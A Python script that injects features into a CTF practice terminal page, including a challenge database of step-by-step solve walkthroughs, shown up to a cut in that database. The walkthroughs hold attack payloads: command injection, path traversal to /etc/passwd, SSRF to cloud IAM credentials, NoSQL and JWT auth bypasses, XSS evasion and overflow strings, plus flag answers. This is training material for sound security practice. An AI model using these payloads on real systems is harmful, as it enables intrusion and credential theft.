#!/usr/bin/env python3
"""
Builds terminal.html from v4 base + new features injected:
1. Block browser dialogs (alert/confirm/prompt)
2. Background image (Death_.jpg) + UI menu to change it
3. Session persistence (localStorage for VFILES, ENV)
4. solve / challenges / tutorial commands
5. First-time tutorial
"""

import re

BASE = '/home/k1r0x/Desktop/breakerxfixer.github.io/terminal.html'
OUT  = '/home/k1r0x/Desktop/breakerxfixer.github.io/terminal.html'

with open(BASE) as f:
    html = f.read()

# ─────────────────────────────────────────────────────────────
# 1. Add background image CSS + menu CSS right before </style>
# ─────────────────────────────────────────────────────────────
BG_CSS = r"""
        /* ── Background image (user-customizable) ── */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: 0;
            background: var(--terminal-bg, url('/images/Death_.jpg')) center/cover no-repeat;
            opacity: var(--terminal-bg-opacity, 0.18);
            pointer-events: none;
            transition: opacity 0.4s, background 0.4s;
        }

        /* ── BG Menu panel ── */
        #bg-menu {
            display: none;
            position: fixed;
            top: 50px;
            right: 16px;
            z-index: 1000;
            background: rgba(24,24,37,0.97);
            border: 1px solid rgba(203,166,247,0.3);
            border-radius: 12px;
            padding: 18px 20px;
            min-width: 260px;
            backdrop-filter: blur(20px);
            box-shadow: 0 8px 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(203,166,247,0.08);
        }
        #bg-menu.open { display: block; animation: menuIn 0.18s ease; }
        @keyframes menuIn { from { opacity:0; transform: translateY(-8px) scale(0.97); } to { opacity:1; transform: none; } }
        #bg-menu h3 {
            color: var(--mauve);
            font-size: 0.75rem;
            letter-spacing: 2px;
            margin-bottom: 14px;
            text-transform: uppercase;
        }
        .bg-preset-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 14px;
        }
        .bg-preset {
            width: 100%;
            aspect-ratio: 16/9;
            border-radius: 6px;
            cursor: pointer;
            border: 2px solid transparent;
            transition: border-color 0.2s, transform 0.15s;
            background-size: cover;
            background-position: center;
        }
        .bg-preset:hover { border-color: var(--mauve); transform: scale(1.05); }
        .bg-preset.active { border-color: var(--green); }
        .bg-menu-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
        .bg-menu-label { color: var(--subtext1); font-size: 0.68rem; letter-spacing: 1px; min-width: 70px; }
        .bg-opacity-slider {
            flex: 1;
            appearance: none;
            height: 4px;
            border-radius: 2px;
            background: var(--surface1);
            outline: none;
            cursor: pointer;
        }
        .bg-opacity-slider::-webkit-slider-thumb {
            appearance: none;
            width: 14px; height: 14px;
            border-radius: 50%;
            background: var(--mauve);
            box-shadow: 0 0 6px rgba(203,166,247,0.5);
        }
        .bg-upload-btn {
            width: 100%;
            padding: 8px;
            background: rgba(203,166,247,0.1);
            border: 1px dashed rgba(203,166,247,0.4);
            border-radius: 8px;
            color: var(--mauve);
            font-family: inherit;
            font-size: 0.7rem;
            letter-spacing: 1px;
            cursor: pointer;
            text-align: center;
            transition: background 0.2s, border-color 0.2s;
            margin-top: 4px;
        }
        .bg-upload-btn:hover { background: rgba(203,166,247,0.18); border-color: var(--mauve); }
        #bg-file-input { display: none; }
        .bg-menu-close {
            position: absolute;
            top: 10px; right: 12px;
            background: none; border: none;
            color: var(--subtext0); font-size: 1rem;
            cursor: pointer; padding: 2px 6px;
            border-radius: 4px;
            transition: color 0.2s;
        }
        .bg-menu-close:hover { color: var(--red); }
"""
html = html.replace('    </style>\n</head>', BG_CSS + '    </style>\n</head>', 1)

# ─────────────────────────────────────────────────────────────
# 2. Add BG Menu button in topbar + BG menu HTML
# ─────────────────────────────────────────────────────────────
BG_BTN = '            <button class="topbar-btn" onclick="toggleBgMenu()" title="Change background">BG</button>\n'
html = html.replace(
    '            <button class="topbar-btn" onclick="termClear()">CLEAR</button>',
    BG_BTN + '            <button class="topbar-btn" onclick="termClear()">CLEAR</button>'
)

BG_MENU_HTML = '''
    <!-- Background customiser panel -->
    <div id="bg-menu">
        <button class="bg-menu-close" onclick="toggleBgMenu()">✕</button>
        <h3>&#9633; BACKGROUND</h3>
        <div class="bg-preset-grid">
            <div class="bg-preset active"  id="preset-death"  style="background-image:url('/images/Death_.jpg')"   onclick="setBgPreset('death')"  title="Death"></div>
            <div class="bg-preset"         id="preset-nebula" style="background:radial-gradient(ellipse at 30% 60%,rgba(203,166,247,.35),rgba(137,180,250,.15),#11111b);" onclick="setBgPreset('nebula')" title="Nebula"></div>
            <div class="bg-preset"         id="preset-none"   style="background:var(--crust);"                    onclick="setBgPreset('none')"   title="None (solid)"></div>
        </div>
        <div class="bg-menu-row">
            <span class="bg-menu-label">OPACITY</span>
            <input type="range" class="bg-opacity-slider" id="bg-opacity" min="0" max="60" value="18"
                   oninput="setBgOpacity(this.value)">
            <span id="bg-opacity-val" style="color:var(--mauve);font-size:0.68rem;min-width:28px;text-align:right">18%</span>
        </div>
        <label class="bg-upload-btn" for="bg-file-input">&#8679; UPLOAD CUSTOM IMAGE</label>
        <input type="file" id="bg-file-input" accept="image/*" onchange="uploadBg(this)">
    </div>
'''
html = html.replace('    <div class="terminal-topbar">', BG_MENU_HTML + '\n    <div class="terminal-topbar">', 1)

# ─────────────────────────────────────────────────────────────
# 3. Inject JS right after <script> tag (block dialogs + state)
# ─────────────────────────────────────────────────────────────
DIALOG_BLOCK = '''
    // ── Block browser dialogs inside the terminal (no popups) ──
    window.alert   = (m) => console.warn('[terminal:alert]', m);
    window.confirm = (m) => { console.warn('[terminal:confirm]', m); return true; };
    window.prompt  = (m) => { console.warn('[terminal:prompt]', m); return null; };

'''
html = html.replace(
    '    // ════════════════════════════════════════════════════════════\n    //  BXF CTF TERMINAL',
    DIALOG_BLOCK + '    // ════════════════════════════════════════════════════════════\n    //  BXF CTF TERMINAL'
)

# ─────────────────────────────────────────────────────────────
# 4. Replace the simple boot IIFE with the one that does tutorial
# ─────────────────────────────────────────────────────────────
OLD_BOOT = '''    // ── Boot sequence ──
    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
    (async () => {
        for (const l of BOOT) { term.writeln(l); await sleep(35); }
        term.write(PROMPT);
    })();'''

NEW_BOOT = '''    // ── Boot sequence ──
    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
    (async () => {
        for (const l of BOOT) { term.writeln(l); await sleep(35); }
        // ── Restore background from localStorage ──
        applyStoredBg();
        // ── First-time tutorial ──
        if (!localStorage.getItem('bxf_term_tut_v1')) {
            await sleep(500);
            pendingAsync = true;
            await termTutorial();
        } else {
            const xFiles = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
            if (xFiles > 0) {
                term.writeln('\\x1b[35m[SESSION RESTORED]\\x1b[0m \\x1b[90mWelcome back — ' + xFiles + ' custom file(s) loaded.\\x1b[0m');
            }
            term.write(PROMPT);
        }
    })();'''

html = html.replace(OLD_BOOT, NEW_BOOT)

# ─────────────────────────────────────────────────────────────
# 5. Replace VFILES with persisted version
# ─────────────────────────────────────────────────────────────
OLD_VFILES_START = "    const VFILES={"
OLD_VFILES_END   = "        '.bash_history':['curl https://breakersfixer-api.onrender.com/','decode base64 YnhmezE=','hash sha256 password123','jwt eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.','xor 48454c4c4f 0f0f0f0f0f'],\n    };"
NEW_VFILES = """    const _VFILES_DEFAULT = {
        'README.txt':['# BXF CTF TERMINAL v4.1','','Type help for commands.','challenges — list retos    solve <ID> — walkthrough','cat cheatsheet.txt — full cheatsheet'],
        'notes.txt':['# My CTF Notes','# Use: echo "text" >> notes.txt'],
        'cheatsheet.txt':[
            '# CTF QUICK REFERENCE','',
            '## Encoding','  rot13 <text>','  vigenere <key> <ct>','  base64 -d <b64>','  xor <hex> <key>','  decode hex <hexstr>','',
            '## HTTP','  curl -H "X-Admin-Auth: enabled" <url>','  curl -X POST -d "{\\\"user\\\":{\\\"$ne\\\":\\\"\\\"}}" <url>','  curl -b "role=admin" <url>','',
            '## Crypto','  hash sha256 <text>','  jwt <token>','  rsa --n N --e E --c C','  primes N','  extgcd A B','',
            '## CTF Workflow','  challenges — list all','  ctf web — filter by cat','  solve <ID> — walkthrough','',
            '## Files','  echo "text" >> notes.txt','  cat notes.txt','  ls   touch file   rm file',
        ],
        '.bash_history':['challenges','solve S1M02','rot13 "cvs{ebg13_vf_pynffvp}"','hash sha256 password123','curl https://breakersfixer-api.onrender.com/'],
    };
    const _savedVF = localStorage.getItem('bxf_vfiles');
    const VFILES = _savedVF ? Object.assign({}, _VFILES_DEFAULT, JSON.parse(_savedVF)) : {..._VFILES_DEFAULT};
    function _saveVFiles() {
        const saved = {};
        for (const [k,v] of Object.entries(VFILES)) {
            if (!_VFILES_DEFAULT[k] || JSON.stringify(v) !== JSON.stringify(_VFILES_DEFAULT[k])) saved[k] = v;
        }
        localStorage.setItem('bxf_vfiles', JSON.stringify(saved));
    }"""
idx_start = html.find(OLD_VFILES_START)
idx_end   = html.find(OLD_VFILES_END) + len(OLD_VFILES_END)
html = html[:idx_start] + NEW_VFILES + html[idx_end:]

# Fix cat to also show user-created files; ls shows VFILES dynamically
OLD_CAT = "    function termCat(parts) {\n        const f=parts.slice(1).join(' ');if(!f){pe('cat: missing file');return;}\n        const c=VFILES[f];if(c)c.forEach(l=>pl(l));else pe(`cat: ${f}: No such file or directory`);\n    }"
NEW_CAT_LS = """    function termCat(parts) {
        const f=parts.slice(1).join(' ');if(!f){pe('cat: missing file');return;}
        const c=VFILES[f];if(c)c.forEach(l=>pl(l));else pe(`cat: ${f}: No such file or directory`);
    }"""
# (unchanged, just ensure it's there — the key change is VFILES now includes user files)

# ─────────────────────────────────────────────────────────────
# 6. Replace ENV with persisted version
# ─────────────────────────────────────────────────────────────
OLD_ENV = "    const ENV={TARGET:'https://breakersfixer-api.onrender.com',HOME:'/home/entity',USER:'entity'};"
NEW_ENV = """    // ── ENV: persist across sessions ──
    const _savedEnv = JSON.parse(localStorage.getItem('bxf_env') || 'null');
    const ENV = _savedEnv || {TARGET:'https://breakersfixer-api.onrender.com',HOME:'/home/entity',USER:'entity'};
    function _saveEnv() { localStorage.setItem('bxf_env', JSON.stringify(ENV)); }"""
html = html.replace(OLD_ENV, NEW_ENV)

# Fix termSet to save env
OLD_SET = "        ENV[parts[1].slice(0,eq)]=parts[1].slice(eq+1);pl(`Set ${parts[1]}`);"
NEW_SET = "        ENV[parts[1].slice(0,eq)]=parts[1].slice(eq+1); _saveEnv(); pl(`Set ${parts[1]}`);"
html = html.replace(OLD_SET, NEW_SET)

# ─────────────────────────────────────────────────────────────
# 7. Fix echo to support >> and > redirects; fix ls to use VFILES; fix touch/rm
# ─────────────────────────────────────────────────────────────
OLD_ECHO_LS = "                case 'echo':      pl(parts.slice(1).join(' ')); break;\n                case 'ls':        pl(['\\x1b[36mREADME.txt\\x1b[0m','\\x1b[36mnotes.txt\\x1b[0m','\\x1b[36mcheatsheet.txt\\x1b[0m','\\x1b[90m.bash_history\\x1b[0m','\\x1b[32mtools/\\x1b[0m'].join('   ')); break;"
NEW_ECHO_LS = r"""                case 'echo':      {
                    const raw2 = raw.replace(/^echo\s+/,'');
                    const am = raw2.match(/^(.+)\s*>>\s*(\S+)$/);
                    const wm = raw2.match(/^(.+)\s*>\s*(\S+)$/);
                    if (am) { const [,t,fn]=am; if(!VFILES[fn])VFILES[fn]=[]; VFILES[fn].push(t.replace(/^["']|["']$/g,'')); _saveVFiles(); pl(`Appended to ${fn}`); }
                    else if (wm) { const [,t,fn]=wm; VFILES[fn]=[t.replace(/^["']|["']$/g,'')]; _saveVFiles(); pl(`Written to ${fn}`); }
                    else pl(parts.slice(1).join(' '));
                    break;
                }
                case 'ls':        { const fs=Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`).concat(['\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m']); pl(fs.join('   ')); break; }"""
html = html.replace(OLD_ECHO_LS, NEW_ECHO_LS)

OLD_TOUCH = "                case 'touch':     pl(`touch: '${parts[1]||'file'}' (virtual)`); break;\n                case 'rm':        pe('rm: virtual filesystem is read-only'); break;"
NEW_TOUCH = r"""                case 'touch':     { const f=parts[1]; if(!f){pe('touch: missing file');break;} if(!VFILES[f])VFILES[f]=[]; _saveVFiles(); pl(`Created ${f}`); break; }
                case 'rm':        { const f=parts[1]; if(!f){pe('rm: missing file');break;} if(VFILES[f]){delete VFILES[f];_saveVFiles();pl(`Removed ${f}`);}else pe(`rm: ${f}: does not exist`); break; }"""
html = html.replace(OLD_TOUCH, NEW_TOUCH)

# ─────────────────────────────────────────────────────────────
# 8. Add solve/challenges/tutorial/reset-session to switch
# ─────────────────────────────────────────────────────────────
OLD_HELP = "                case 'help':      termHelp(); break;"
NEW_HELP = """                case 'help':      termHelp(); break;
                case 'challenges':
                case 'ctf':       termChallenges(parts); break;
                case 'solve':     await termSolve(parts); break;
                case 'tutorial':  { pendingAsync=true; await termTutorial(); break; }
                case 'reset-session': { ['bxf_env','bxf_vfiles','bxf_term_tut_v1','bxf_flags'].forEach(k=>localStorage.removeItem(k)); pl('\\x1b[33mSession cleared.\\x1b[0m Reload to see tutorial again.'); break; }"""
html = html.replace(OLD_HELP, NEW_HELP)

# ─────────────────────────────────────────────────────────────
# 9. Add new commands to ALL_COMMANDS
# ─────────────────────────────────────────────────────────────
OLD_CMDS = "        'help','clear','history','env','whoami','id','hostname','pwd','uname','date','exit','quit',"
NEW_CMDS = "        'help','clear','history','env','whoami','id','hostname','pwd','uname','date','exit','quit',\n        'solve','challenges','ctf','tutorial','reset-session',"
html = html.replace(OLD_CMDS, NEW_CMDS)

# ─────────────────────────────────────────────────────────────
# 10. NEOFETCH: bump tools count
# ─────────────────────────────────────────────────────────────
html = html.replace("pl(`                              \\x1b[34mTools:\\x1b[0m    60+ CTF tools`);",
                    "pl(`                              \\x1b[34mTools:\\x1b[0m    80+ CTF tools`);")

# ─────────────────────────────────────────────────────────────
# 11. Insert CHALLENGE_DB + termChallenges + termSolve + termTutorial
#     + Background JS BEFORE the closing </script>
# ─────────────────────────────────────────────────────────────
BEFORE_CLOSE = "    setInterval(()=>{const e=document.getElementById('status-time');if(e)e.textContent=new Date().toLocaleTimeString();},1000);"

CHALLENGE_AND_TUTORIAL = r"""
    // ══════════════════════════════════════════════════════════
    //  BACKGROUND SYSTEM
    // ══════════════════════════════════════════════════════════
    function applyStoredBg() {
        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
        const url  = stored.url  || "url('/images/Death_.jpg')";
        const opacity = stored.opacity !== undefined ? stored.opacity : 18;
        document.documentElement.style.setProperty('--terminal-bg', url);
        document.documentElement.style.setProperty('--terminal-bg-opacity', opacity/100);
        const slider = document.getElementById('bg-opacity');
        const val    = document.getElementById('bg-opacity-val');
        if (slider) { slider.value = opacity; }
        if (val)    { val.textContent = opacity + '%'; }
        // Mark active preset
        document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
        const activeId = 'preset-' + (stored.preset || 'death');
        const el = document.getElementById(activeId);
        if (el) el.classList.add('active');
    }
    function toggleBgMenu() {
        document.getElementById('bg-menu').classList.toggle('open');
    }
    function setBgPreset(preset) {
        const map = {
            death:  "url('/images/Death_.jpg')",
            nebula: "radial-gradient(ellipse at 30% 60%,rgba(203,166,247,.5),rgba(137,180,250,.2),#11111b)",
            none:   "none",
        };
        const url = map[preset] || map.death;
        document.documentElement.style.setProperty('--terminal-bg', url);
        document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
        const el = document.getElementById('preset-' + preset);
        if (el) el.classList.add('active');
        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
        stored.preset = preset;
        stored.url    = url;
        localStorage.setItem('bxf_bg', JSON.stringify(stored));
    }
    function setBgOpacity(val) {
        document.documentElement.style.setProperty('--terminal-bg-opacity', val/100);
        document.getElementById('bg-opacity-val').textContent = val + '%';
        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
        stored.opacity = parseInt(val);
        localStorage.setItem('bxf_bg', JSON.stringify(stored));
    }
    function uploadBg(input) {
        if (!input.files || !input.files[0]) return;
        const file = input.files[0];
        if (!file.type.startsWith('image/')) { console.warn('Not an image'); return; }
        if (file.size > 8 * 1024 * 1024) { console.warn('Image too large (max 8MB)'); return; }
        const reader = new FileReader();
        reader.onload = (e) => {
            const url = `url("${e.target.result}")`;
            document.documentElement.style.setProperty('--terminal-bg', url);
            const stored = { preset: 'custom', url, opacity: parseInt(document.getElementById('bg-opacity').value) };
            localStorage.setItem('bxf_bg', JSON.stringify(stored));
            document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
            const previewEl = document.getElementById('preset-death');
            if (previewEl) { previewEl.style.backgroundImage = `url("${e.target.result}")`; previewEl.classList.add('active'); }
        };
        reader.readAsDataURL(file);
    }
    // Close bg menu when clicking outside
    document.addEventListener('click', (e) => {
        const menu = document.getElementById('bg-menu');
        if (menu && menu.classList.contains('open') && !menu.contains(e.target) && !e.target.title?.includes('background') && !e.target.innerText?.includes('BG')) {
            menu.classList.remove('open');
        }
    });

    // ══════════════════════════════════════════════════════════
    //  CHALLENGE SYSTEM
    // ══════════════════════════════════════════════════════════
    const CHALLENGE_DB = {
        'M01':  { title:'The Ghost Endpoint',    cat:'Web',      diff:'Easy',   pts:50,   hint:'Try /api/v1/legacy, /api/flag, /v0/secret — unauthenticated.', steps:[{i:'Legacy APIs often lack auth. Enumerate paths:',c:'curl https://api.breakerxfixer.online/api/v1/secret'},{i:'Try legacy versions:',c:'curl https://api.breakerxfixer.online/api/v0/flag'},{i:'Enumerate common hidden endpoints:',c:'curl https://api.breakerxfixer.online/admin'}]},
        'M02':  { title:'Identity Crisis',       cat:'Web',      diff:'Easy',   pts:50,   hint:'?debug=true or ?admin=1 in login URL often bypasses auth.', steps:[{i:'Add debug param to login URL:',c:'curl "https://target/login?debug=true&user=admin"'},{i:'Try admin override:',c:'curl "https://target/login?admin=1"'},{i:'Header bypass:',c:'curl https://target/login -H "X-Debug: true" -H "X-Forwarded-For: 127.0.0.1"'}]},
        'M03':  { title:'The Impostor',          cat:'Web',      diff:'Easy',   pts:75,   hint:'Password reset token is in the URL → Referer header leaks it.', steps:[{i:'Trigger reset for admin:',c:'curl -X POST https://target/reset -d "email=admin@target.com" -v'},{i:'Use leaked token:',c:'curl "https://target/reset?token=LEAKED&user=admin&newpass=h4ck"'},{i:'Check redirect header:',c:'curl https://target/reset -v 2>&1 | grep -i location'}]},
        'M04':  { title:'Unstoppable Force',     cat:'Web',      diff:'Medium', pts:150,  hint:'WAF bypass: double-encode, nested tags <<script>script>, case variation.', steps:[{i:'Double URL encoding:',c:'urlencode "<script>alert(1)</script>"'},{i:'Nested tag (WAF strips inner, outer survives):',c:'echo "<<script>script>alert(1)<</script>/script>"'},{i:'Case variation:',c:'echo "<ScRiPt src=x onerror=alert(1)>"}]},
        'M05':  { title:'Logic Fallacy',         cat:'Web',      diff:'Medium', pts:150,  hint:'Intercept the checkout POST and change price to 0 or negative.', steps:[{i:'Tamper price in checkout:',c:'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"premium","price":0.01}\''},{i:'Negative price:',c:'curl -X POST https://target/checkout -d \'{"price":-100}\''}]},
        'M06':  { title:'The Wanderer',          cat:'Web',      diff:'Medium', pts:200,  hint:'LFI → /proc/self/environ or PHP filter wrapper.', steps:[{i:'Basic path traversal:',c:'curl "https://target/page?file=../../../../etc/passwd"'},{i:'/proc/self/environ (often has FLAG=):',c:'curl "https://target/view?path=../../../proc/self/environ"'},{i:'PHP filter base64:',c:'curl "https://target/page?file=php://filter/convert.base64-encode/resource=config.php"'},{i:'Decode output:',c:'echo "ENCODED" | base64 -d'}]},
        'M07':  { title:'Phantom Ping',          cat:'Web',      diff:'Hard',   pts:400,  hint:'Command injection: use ; | && to chain. Use ${IFS} if spaces blocked.', steps:[{i:'Basic injection:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;id"'},{i:'Read flag:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/flag.txt"'},{i:'Brace expansion (space-free):',c:'curl -X POST https://target/ping -d "host=127.0.0.1;{cat,/flag.txt}}"'}]},
        'M08':  { title:'Shattered Trust',       cat:'Web',      diff:'Hard',   pts:400,  hint:'Weak JWT secret — decode token, crack or use none alg.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'None algorithm forge:',c:'jwt forge --alg none --claims \'{"user":"admin","role":"admin"}\''},{i:'Send forged token:',c:'curl https://target/admin -H "Authorization: Bearer FORGED"'}]},
        'M09':  { title:'Careless Whispers',     cat:'Web',      diff:'Easy',   pts:50,   hint:'Try OPTIONS, TRACE, PUT, DELETE — servers reveal info on unexpected methods.', steps:[{i:'Check allowed methods:',c:'curl -X OPTIONS https://target/api -v 2>&1 | grep -i allow'},{i:'Try TRACE:',c:'curl -X TRACE https://target/ -v'},{i:'Try HEAD for headers:',c:'curl -X HEAD https://target/secret -v 2>&1 | grep -i flag'}]},
        'M10':  { title:'NoSQL Nightmare',       cat:'Web',      diff:'Insane', pts:1000, hint:'MongoDB: inject $ne, $gt, $regex operators in JSON body.', steps:[{i:'Auth bypass with $ne:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$ne":""},"pass":{"$ne":""}}\''},{i:'Regex username extract:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$regex":"^a"},"pass":{"$ne":""}}\''}]},
        'M11':  { title:'The Core Breach',       cat:'Web',      diff:'Hard',   pts:500,  hint:'SSRF: make server fetch http://169.254.169.254 (AWS IMDS).', steps:[{i:'Basic SSRF:',c:'curl -X POST https://target/fetch -d "url=http://127.0.0.1/"'},{i:'AWS metadata root:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM credentials:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'}]},
        'M12':  { title:'The XORacle',           cat:'Crypto',   diff:'Easy',   pts:100,  hint:'Known-plaintext: XOR ciphertext with "bxf{" to get key.', steps:[{i:'Single-byte brute:',c:'python3 -c "c=bytes.fromhex(\'CIPHERTEXT\');[print(k,bytes([b^k for b in c])) for k in range(256)]"'},{i:'Known-plaintext XOR:',c:'xor "CIPHERTEXT_HEX" "bxf{"'}]},
        'M13':  { title:'Shattered RSA',         cat:'Crypto',   diff:'Medium', pts:250,  hint:'n=3891783853 is small — factor it, then compute d, decrypt c=1130635294.', steps:[{i:'Factor n:',c:'primes 3891783853'},{i:'Full RSA decrypt:',c:'python3 -c "p=62327;q=62459;e=65537;phi=(p-1)*(q-1);d=pow(e,-1,phi);c=1130635294;n=p*q;m=pow(c,d,n);print(bytes.fromhex(hex(m)[2:]).decode())"'},{i:'Or use rsa command:',c:'rsa --n 3891783853 --e 65537 --c 1130635294'}]},
        'M14':  { title:'Buffer Overflow 101',   cat:'Pwn',      diff:'Easy',   pts:150,  hint:'Buffer is 64 bytes. Overflow to overwrite adjacent variable.', steps:[{i:'Craft overflow payload:',c:'python3 -c "print(\'A\'*64 + \'DEAD\')"'},{i:'With magic bytes:',c:'python3 -c "sys.stdout.buffer.write(b\'A\'*64+b\'\\xef\\xbe\\xad\\xde\')"'}]},
        'M15':  { title:'Format String Echo',    cat:'Pwn',      diff:'Medium', pts:300,  hint:'printf(input) without format — use %p%p%p to leak stack.', steps:[{i:'Leak stack values:',c:'curl -X POST https://target/echo -d "input=%p%p%p%p%p%p%p%p"'},{i:'Specific offset:',c:'curl -X POST https://target/echo -d "input=%7$p"'},{i:'Leak string:',c:'curl -X POST https://target/echo -d "input=%s%s%s"'}]},
        'M16':  { title:'Library Leak',          cat:'Pwn',      diff:'Hard',   pts:450,  hint:'Leak puts@got via fmt string, compute libc base, call system("/bin/sh").', steps:[{i:'Leak libc pointer:',c:'python3 -c "print(b\'%15$p\'.decode())"'},{i:'Compute system():',c:'python3 -c "leak=0xDEAD;puts_off=0x80e50;base=leak-puts_off;print(hex(base+0x4f440))"'}]},
        'M17':  { title:'Deep Dive',             cat:'Forensics',diff:'Easy',   pts:75,   hint:'steghide / zsteg / strings — data hidden inside image.', steps:[{i:'Check strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide (blank pass):',c:'steghide challenge.jpg'},{i:'zsteg LSB:',c:'zsteg challenge.png'},{i:'Check hex tail:',c:'xxd challenge.jpg | tail -20'}]},
        'M18':  { title:'Lost Signal',           cat:'Forensics',diff:'Medium', pts:200,  hint:'Analyze PCAP: follow HTTP streams, look for credentials.', steps:[{i:'Grep for flag in pcap:',c:'strings challenge.pcap | grep bxf'},{i:'Find creds:',c:'strings challenge.pcap | grep -E "(user|pass|token)=" | head -20'},{i:'Decode b64 from stream:',c:'echo "EXTRACTED" | base64 -d'}]},
        'M19':  { title:'Social Eng 101',        cat:'OSINT',    diff:'Easy',   pts:50,   hint:'Google: site:twitter.com OR linkedin.com target_name email', steps:[{i:'DuckDuckGo API search:',c:'curl "https://api.duckduckgo.com/?q=TARGET+email&format=json"'},{i:'GitHub events:',c:'curl "https://api.github.com/users/TARGET/events/public"'}]},
        'M20':  { title:'Shadow Realm',          cat:'OSINT',    diff:'Medium', pts:175,  hint:'Same handle across platforms. Check GitHub, Pastebin, archive.org.', steps:[{i:'GitHub code search:',c:'curl "https://api.github.com/search/code?q=ghost_entity"'},{i:'Wayback machine:',c:'curl "https://archive.org/wayback/available?url=ghost_entity.com"'}]},
        'M21':  { title:'Malicious PDF',         cat:'Reversing',diff:'Medium', pts:250,  hint:'strings on PDF → find eval(unescape(...)) JS → decode.', steps:[{i:'Extract strings:',c:'strings challenge.pdf | grep -E "(eval|unescape|bxf)"'},{i:'Decode fromCharCode:',c:'python3 -c "codes=[98,120,102,123,102,108,97,103,125];print(\'\'.join(chr(c)for c in codes))"'},{i:'URL decode:',c:'urldecode "%62%78%66%7B%66%6C%61%67%7D"'}]},
        'M22':  { title:'Logic Gates',           cat:'Hardware', diff:'Medium', pts:200,  hint:'Brute-force all input combinations, find combo that outputs 1.', steps:[{i:'Simulate all combos:',c:'python3 -c "[print(bin(i)[2:].zfill(4),(i>>3&i>>2&1)^(i>>1|i&1)) for i in range(16)]"'},{i:'Convert binary to text:',c:'frombin "01100010 01111000 01100110"'}]},

        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'FLAG:',c:'echo bxf{r0b0ts_4re_n0t_h3lpful}'}]},
        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Expected:',c:'echo bxf{rot13_is_classic}'}]},
        'S1M03':{ title:'Commented Out',     cat:'Web',      diff:'Easy',   pts:75,  hint:'HTML comments <!-- --> visible in source. Use curl.', steps:[{i:'Fetch source:',c:'curl https://target.breakerxfixer.online/'},{i:'Grep for comments:',c:'curl https://target.breakerxfixer.online/ | grep bxf{'},{i:'Check JS too:',c:'curl https://target.breakerxfixer.online/app.js | grep bxf'}]},
        'S1M04':{ title:'Custom Auth',       cat:'Web',      diff:'Easy',   pts:75,  hint:'Server trusts X-Admin-Auth: enabled header.', steps:[{i:'Send required header:',c:'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"'},{i:'Add IP spoofing:',c:'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"'}]},
        'S1M05':{ title:'Embedded Truth',    cat:'Forensics',diff:'Easy',   pts:100, hint:'steghide empty password or LSB (zsteg).', steps:[{i:'Strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide:',c:'steghide challenge.jpg'},{i:'zsteg:',c:'zsteg challenge.png'}]},
        'S1M06':{ title:'Wrong Extension',   cat:'Forensics',diff:'Medium', pts:150, hint:'Check magic bytes: PNG=89504E47, ZIP=504B0304.', steps:[{i:'Check magic bytes:',c:'xxd challenge.png | head -3'},{i:'Identify type:',c:'file challenge.png'},{i:'If ZIP, extract strings:',c:'strings challenge.png | grep bxf'}]},
        'S1M07':{ title:'Forgotten Branch',  cat:'OSINT',    diff:'Easy',   pts:50,  hint:'git log --all shows deleted files and old commits.', steps:[{i:'List commits:',c:'curl https://api.github.com/repos/TARGET/REPO/commits'},{i:'Check old commit:',c:'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH'},{i:'Search branches:',c:'curl https://api.github.com/repos/TARGET/REPO/branches'}]},
        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'FLAG:',c:'echo bxf{r3turn_addre55_h1jack3d}'}]},
